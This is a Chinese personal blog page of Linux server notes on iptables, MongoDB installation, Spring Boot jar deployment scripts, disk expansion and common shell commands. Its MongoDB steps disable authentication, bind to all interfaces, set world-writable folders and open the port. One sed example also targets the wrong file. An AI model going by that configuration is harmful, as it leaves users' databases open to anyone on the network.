</span></span><span class="line"><span class="cl">:FORWARD ACCEPT <span class="o">[</span>0:0<span class="o">]</span>
</span></span><span class="line"><span class="cl">:OUTPUT ACCEPT <span class="o">[</span>19:1438<span class="o">]</span>
</span></span><span class="line"><span class="cl">-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
</span></span><span class="line"><span class="cl">-A INPUT -p icmp -j ACCEPT
</span></span><span class="line"><span class="cl">-A INPUT -i lo -j ACCEPT
</span></span><span class="line"><span class="cl">-A INPUT -p tcp -m state --state NEW -m tcp --dport <span class="m">22</span> -j ACCEPT
</span></span><span class="line"><span class="cl">-A INPUT -p tcp -m tcp --dport <span class="m">20001</span> -j ACCEPT
</span></span><span class="line"><span class="cl">-A INPUT -j REJECT --reject-with icmp-host-prohibited
</span></span><span class="line"><span class="cl">-A FORWARD -j REJECT --reject-with icmp-host-prohibited
</span></span><span class="line"><span class="cl">COMMIT
</span></span><span class="line"><span class="cl"><span class="c1"># Completed on Tue Aug 20 10:09:45 2019</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>注意这一行<code>-A INPUT -j REJECT --reject-with icmp-host-prohibited</code>，如果我们添加的规则在这行之下那么就不会生效</p>
<p>解决办法：在<code>-A INPUT -j REJECT --reject-with icmp-host-prohibited</code>之前加入我们的规则即可</p>
<p>如果防火墙放行了端口，但是仍然访问不到的话，可能是因为添加规则的时候，用的是iptables -A 选项，这样，增加的规则会排列在 第6条 规则后面，虽然<code>service iptables status</code>显示放行了端口，但是实际上，由于第六条规则的原因，新增加的这条并没有起作用。</p>
<p>改为使用iptables -I 插入规则即可，将规则添加到 第6条 之前，就可以生效了。</p>
<p>但是当我执行<code>service iptables status</code>命令时出现如下错误：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Redirecting to /bin/systemctl status iptables.service
</span></span><span class="line"><span class="cl">Unit iptables.service could not be found.
</span></span></code></pre></td></tr></table>
</div>
</div><p>原因是没有安装iptables-services</p>
<p><a href="https://blog.csdn.net/y368769/article/details/104490697/">https://blog.csdn.net/y368769/article/details/104490697/</a></p>
<h3 id="安装mongodb-1">安装MongoDB<a hidden class="anchor" aria-hidden="true" href="#安装mongodb-1">#</a></h3>
<p><a href="https://www.jianshu.com/p/994bc7b19b26">https://www.jianshu.com/p/994bc7b19b26</a></p>
<p><a href="https://www.cnblogs.com/xiaoyaojinzhazhadehangcheng/p/12156597.html">https://www.cnblogs.com/xiaoyaojinzhazhadehangcheng/p/12156597.html</a></p>
<p>1.解压</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tar -zxvf /home/binbin/mongodb-linux-x86_64-4.0.0.tgz -C /usr/local/
</span></span></code></pre></td></tr></table>
</div>
</div><p>之后装的时候把文件目录改个名，因为之后要有很多关于这个目录的配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@VM-4-12-centos ~]# cd /usr/local
</span></span><span class="line"><span class="cl">[root@VM-4-12-centos local]# mv mongodb-linux-x86_64-4.0.0/ mongodb
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.修改配置文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vim /etc/profile
</span></span></code></pre></td></tr></table>
</div>
</div><p>在 export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL 一行的上面添加如下内容:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#set mongodb
</span></span><span class="line"><span class="cl">export PATH=/usr/local/mongodb-linux-x86_64-4.0.0/bin:$PATH
</span></span></code></pre></td></tr></table>
</div>
</div><p>使环境变量生效</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">source /etc/profile
</span></span></code></pre></td></tr></table>
</div>
</div><p>3.创建数据库目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cd /usr/local/mongodb
</span></span><span class="line"><span class="cl">$ touch mongodb.conf
</span></span><span class="line"><span class="cl">$ mkdir db
</span></span><span class="line"><span class="cl">$ mkdir log
</span></span><span class="line"><span class="cl">$ cd log
</span></span><span class="line"><span class="cl">$ touch mongodb.log
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.修改mongodb配置文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vim /usr/local/mongodb/mongodb.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>添加以下内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">port=27017 #端口
</span></span><span class="line"><span class="cl">dbpath= /usr/local/mongodb/db #数据库存文件存放目录
</span></span><span class="line"><span class="cl">logpath= /usr/local/mongodb/log/mongodb.log #日志文件存放路径
</span></span><span class="line"><span class="cl">logappend=true #使用追加的方式写日志
</span></span><span class="line"><span class="cl">fork=true #以守护进程的方式运行，创建服务器进程
</span></span><span class="line"><span class="cl">maxConns=100 #最大同时连接数
</span></span><span class="line"><span class="cl">noauth=true #不启用验证
</span></span><span class="line"><span class="cl">journal=true #每次写入会记录一条操作日志（通过journal可以重新构造出写入的数据）。
</span></span><span class="line"><span class="cl">#即使宕机，启动时wiredtiger会先将数据恢复到最近一次的checkpoint点，然后重放后续的journal日志来恢复。
</span></span><span class="line"><span class="cl">storageEngine=wiredTiger  #存储引擎有mmapv1、wiretiger、mongorocks
</span></span><span class="line"><span class="cl">bind_ip = 0.0.0.0  #这样就可外部访问了，例如从win10中去连虚拟机中的MongoDB
</span></span></code></pre></td></tr></table>
</div>
</div><p>5.设置文件夹权限</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cd /usr/local/mongodb
</span></span><span class="line"><span class="cl">$ chmod 777 db
</span></span><span class="line"><span class="cl">$ chmod 777 log
</span></span></code></pre></td></tr></table>
</div>
</div><p>6.启动mongodb</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mongod --config /usr/local/mongodb/mongodb.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>7.安装完之后记得开放端口</p>
<h3 id="部署项目">部署项目<a hidden class="anchor" aria-hidden="true" href="#部署项目">#</a></h3>
<p><a href="https://www.cnblogs.com/shu-java-net/p/13886242.html">https://www.cnblogs.com/shu-java-net/p/13886242.html</a></p>
<p>1.Springboot 先打包成jar包</p>
<p>2.放到服务器上</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nohup java -jar NettyAPI.jar &amp;
</span></span></code></pre></td></tr></table>
</div>
</div><p>nohup 意思是不挂断运行命令,当账户退出或终端关闭时,程序仍然运行，</p>
<p>当用 nohup 命令执行作业时，缺省情况下该作业的所有输出被重定向到nohup.out的文件中，除非另外指定了输出文件。</p>
<p>3.结束项目</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ps -aux | grep java
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341063.png" alt="image-20211026111713707"  />
</p>
<p>把这个端口kill掉</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kill -s 9 4287
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.使用nginx：外网访问内网项目</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nginx -s reload
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="写-sh-自动启动">写 <code>.sh</code> 自动启动<a hidden class="anchor" aria-hidden="true" href="#写-sh-自动启动">#</a></h4>
<p>1、自己将项目（比如用springboot框架写的项目）打包成jar包，然后我们需要将它用软件传输到linux版本的服务器上（服务器提前安装好JDK&gt;=1.8）。</p>
<p>2、自己编写sh命令，用于启动和关闭项目，并打印日志信息到服务器本地。</p>
<p>1）、start_项目名.sh文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">#For shutting down the 你的项目名.jar</span>
</span></span><span class="line"><span class="cl"><span class="nv">pid</span><span class="o">=</span><span class="k">$(</span>ps -ef <span class="p">|</span> grep 你的项目名.jar<span class="p">|</span> grep -v <span class="s2">&#34;grep&#34;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">kill</span> -9 <span class="nv">$pid</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;The 你的项目名.jar now has been shut down!&#34;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#For starting the 你的项目名.jar</span>
</span></span><span class="line"><span class="cl">nohup java -jar 你的项目名.jar &gt;你的项目日志名.output 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;The 你的项目名.jar now is running!&#34;</span>
</span></span><span class="line"><span class="cl">tailf  你的项目日志名.output
</span></span></code></pre></td></tr></table>
</div>
</div><p>2）、shutdown_项目名.sh文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">#For shutting down the 你的项目名.jar</span>
</span></span><span class="line"><span class="cl"><span class="nv">pid</span><span class="o">=</span><span class="k">$(</span>ps -ef <span class="p">|</span> grep 你的项目名.jar<span class="p">|</span> grep -v <span class="s2">&#34;grep&#34;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">kill</span> -9 <span class="nv">$pid</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;The 你的项目名.jar now has been shut down!&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>3、将你的项目jar包、start_项目名.sh、shutdown_项目名.sh放在服务器的某一个文件夹下（他三个处于同一个目录）,此时，可以用控制台启动和关闭项目了。</p>
<p>4、写完之后放到服务器上面要转换换行符</p>
<p><a href="https://blog.csdn.net/li_1303999/article/details/93159197">https://blog.csdn.net/li_1303999/article/details/93159197</a></p>
<h3 id="文件下载">文件下载<a hidden class="anchor" aria-hidden="true" href="#文件下载">#</a></h3>
<p>使用</p>
<p><code>sz hadoop-mapreduce-examples-3.1.3.jar</code></p>
<p>安装</p>
<p><code>yum install -y lrzsz</code></p>
<h3 id="虚拟机扩容">虚拟机扩容<a hidden class="anchor" aria-hidden="true" href="#虚拟机扩容">#</a></h3>
<p><a href="https://blog.csdn.net/cc1949/article/details/89918775">https://blog.csdn.net/cc1949/article/details/89918775</a></p>
<p>安装gparted</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">yum install gparted
</span></span></code></pre></td></tr></table>
</div>
</div><p>打开gparted</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo gparted
</span></span></code></pre></td></tr></table>
</div>
</div><p>按照上述操作之后， <code>df -h</code> 还是没有变化</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341115.png" alt="image-20220516155217528"  />
</p>
<p>输入 <code>lsblk</code> 发现分区并没有分完，虽然增加到sda2，但是每增加带centos-root中</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341266.png" alt="image-20220516155241874"  />
</p>
<p>把用gparted划分的空间撤回，重新进行分区操作：</p>
<p><a href="https://blog.csdn.net/Akari0216/article/details/108944111">https://blog.csdn.net/Akari0216/article/details/108944111</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/450057653">https://zhuanlan.zhihu.com/p/450057653</a></p>
<p>扩容之后</p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341282.png" alt="image-20220516162422591"  />
</p>
<p>==更新UUID值==</p>
<p><a href="https://blog.csdn.net/Chen_qi_hai/article/details/108814596">https://blog.csdn.net/Chen_qi_hai/article/details/108814596</a></p>
<h3 id="查看mongodb安装路径">查看mongodb安装路径<a hidden class="anchor" aria-hidden="true" href="#查看mongodb安装路径">#</a></h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#方法一
</span></span><span class="line"><span class="cl">find / -name mongodb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#方法二
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">locate mongodb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#方法三
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">whereis mongodb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#方法四
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">which mongodb
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="命令行注解">命令行注解<a hidden class="anchor" aria-hidden="true" href="#命令行注解">#</a></h2>
<h3 id="ps">ps<a hidden class="anchor" aria-hidden="true" href="#ps">#</a></h3>
<p>1）ps -a 显示现行终端机下的所有程序，包括其他用户的程序。</p>
<p>2）ps -A 显示所有程序。</p>
<p>3）ps -c 列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。</p>
<p>4）ps -e 此参数的效果和指定&quot;A&quot;参数相同。</p>
<p>5）ps -e 列出程序时，显示每个程序所使用的环境变量。</p>
<p>6）ps -f 用ASCII字符显示树状结构，表达程序间的相互关系。</p>
<p>7）ps -H 显示树状结构，表示程序间的相互关系。</p>
<p>8）ps -N 显示所有的程序，除了执行ps指令终端机下的程序之外。</p>
<p>9）ps -s 采用程序信号的格式显示程序状况。</p>
<p>10）ps - S 列出程序时，包括已中断的子程序资料。</p>
<p>11）ps -t &lt;终端机编号&gt;指定终端机编号，并列出属于该终端机的程序的状况。</p>
<p>12）ps -u username</p>
<h3 id="grep">grep<a hidden class="anchor" aria-hidden="true" href="#grep">#</a></h3>
<p>用于查找文件里符合条件的字符串</p>
<h3 id="管道符号-">管道符号 |<a hidden class="anchor" aria-hidden="true" href="#管道符号-">#</a></h3>
<p>用法:<code> command 1 | command 2</code> 他的功能是把第一个命令<strong>command 1执行的结果</strong>作为<strong>command 2的输入</strong>传给command 2</p>
<h3 id="sed">sed<a hidden class="anchor" aria-hidden="true" href="#sed">#</a></h3>
<p><strong>参数说明：</strong></p>
<ul>
<li>-i：使 sed 修改文件</li>
<li>-e<script>或&ndash;expression=<script> 以选项中指定的script来处理输入的文本文件</li>
</ul>
<p><strong>动作说明</strong>：</p>
<ul>
<li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</li>
<li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li>
<li>d ：删除，因为是删除啊，所以 d 后面通常不接任何东东；</li>
<li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li>
<li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</li>
<li>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sed -i -e <span class="s1">&#39;s/dir \/tmp\/7001\//dir \/opt\/software\/7001\//g&#39;</span> 7001/redis.conf
</span></span><span class="line"><span class="cl">sed -i -e <span class="s1">&#39;s/dir \/tmp\/7002\//dir \/opt\/software\/7002\//g&#39;</span> 7003/redis.conf
</span></span><span class="line"><span class="cl">sed -i -e <span class="s1">&#39;s/dir \/tmp\/7003\//dir \/opt\/software\/7003\//g&#39;</span> 7003/redis.conf
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="xargs">xargs<a hidden class="anchor" aria-hidden="true" href="#xargs">#</a></h3>
<ul>
<li>-t 表示先打印命令，然后再执行。</li>
<li>-i 或者是-I，这得看linux支持了，将xargs的每项名称，一般是一行一行赋值给 {}，可以用 {} 代替。</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># 方式一：逐个拷贝</span>
</span></span><span class="line"><span class="cl">cp redis-6.2.4/redis.conf <span class="m">7001</span>
</span></span><span class="line"><span class="cl">cp redis-6.2.4/redis.conf <span class="m">7002</span>
</span></span><span class="line"><span class="cl">cp redis-6.2.4/redis.conf <span class="m">7003</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 方式二：管道组合命令，一键拷贝</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">7001</span> <span class="m">7002</span> <span class="m">7003</span> <span class="p">|</span> xargs -t -n <span class="m">1</span> cp redis-6.2.4/redis.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 逐一执行</span>
</span></span><span class="line"><span class="cl">sed -i <span class="s1">&#39;1a replica-announce-ip 192.168.150.101&#39;</span> 7001/redis.conf
</span></span><span class="line"><span class="cl">sed -i <span class="s1">&#39;1a replica-announce-ip 192.168.150.101&#39;</span> 7002/redis.conf
</span></span><span class="line"><span class="cl">sed -i <span class="s1">&#39;1a replica-announce-ip 192.168.150.101&#39;</span> 7003/redis.conf
</span></span><span class="line"><span class="cl"><span class="c1"># 或者一键修改</span>
</span></span><span class="line"><span class="cl"><span class="nb">printf</span> <span class="s1">&#39;%s\n&#39;</span> <span class="m">7001</span> <span class="m">7002</span> <span class="m">7003</span> <span class="p">|</span> xargs -I<span class="o">{}</span> -t sed -i <span class="s1">&#39;1a replica-announce-ip 192.168.150.101&#39;</span> <span class="o">{}</span>/redis.conf
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查看磁盘的占用情况">查看磁盘的占用情况<a hidden class="anchor" aria-hidden="true" href="#查看磁盘的占用情况">#</a></h3>
<p><code>df -h</code></p>
<h3 id="查看当前目录下每个文件夹所占用的空间">查看当前目录下每个文件夹所占用的空间<a hidden class="anchor" aria-hidden="true" href="#查看当前目录下每个文件夹所占用的空间">#</a></h3>
<p><code>du -sh *</code></p>
<h3 id="vim查找">vim查找<a hidden class="anchor" aria-hidden="true" href="#vim查找">#</a></h3>
<p>在normal模式下按下<code>/</code>即可进入查找模式，输入要查找的字符串并按下回车。 Vim会跳转到第一个匹配。按下<code>n</code>查找下一个，按下<code>N</code>查找上一个</p>
<p><a href="https://www.cnblogs.com/marsggbo/p/12152374.html">https://www.cnblogs.com/marsggbo/p/12152374.html</a></p>
<h3 id="update和upgrade">update和upgrade<a hidden class="anchor" aria-hidden="true" href="#update和upgrade">#</a></h3>
<p><code>apt-get update</code> 是更新本地软件列表，在线安装的时候可以在软件列表找到软件；
<code>apt-get upgrade</code> 是更新本地已安装的软件，要谨慎执行。</p>
<h2 id="linux知识">Linux知识<a hidden class="anchor" aria-hidden="true" href="#linux知识">#</a></h2>
<h3 id="软连接">软连接<a hidden class="anchor" aria-hidden="true" href="#软连接">#</a></h3>
<p><a href="https://blog.csdn.net/gao_zhennan/article/details/79127232">https://blog.csdn.net/gao_zhennan/article/details/79127232</a></p>
<h3 id="usrbin和usrlocalbin"><code>/usr/bin</code>和<code>/usr/local/bin</code>,<a hidden class="anchor" aria-hidden="true" href="#usrbin和usrlocalbin">#</a></h3>
<p><code>/bin</code> 是所有用户都可以访问并执行的可执行程序。包括超级用户及一般用户。
<code>/usr/bin</code> 是系统安装时自带的一些可执行程序。即系统程序，轻易不要去动里面的东西，容易入坑。
<code>/usr/local/bin</code> 是用户自行编译安装时默认的可执行程序的安装位置，这个不小心误删点什么，不会影响大局。</p>
<p>首先注意usr 指 Unix System Resource，而不是User</p>
<p>然后通常：</p>
<p><code>/usr/bin</code>下面的都是系统预装的可执行程序，会随着系统升级而改变。</p>
<p><code>/usr/local/bin</code>目录是给用户放置自己的可执行程序的地方，推荐放在这里，不会被系统升级而覆盖同名文件。</p>
<p>如果两个目录下有相同的可执行程序，谁优先执行受到PATH环境变量的影响，比如我的一台服务器的PATH变量为。</p>
<p><code>echo $PATH</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/software/node-v14.8.0-linux-x64/bin
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里<code>/usr/local/bin</code>优先于<code>/usr/bin</code>，一般都是如此。</p>


  </div>

  <footer class="post-footer">
    
<nav class="paginav">
  <a class="prev" href="https://chance7bin.github.io/posts/note/%E4%BD%BF%E7%94%A8-hugo-&#43;-github-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">
    <span class="title">« 上一页</span>
    <br>
    <span>使用 Hugo &#43; Github 搭建个人博客</span>
  </a>
  <a class="next" href="https://chance7bin.github.io/posts/note/springboot-%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/">
    <span class="title">下一页 »</span>
    <br>
    <span>Springboot 项目搭建</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://chance7bin.github.io/">Binb&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
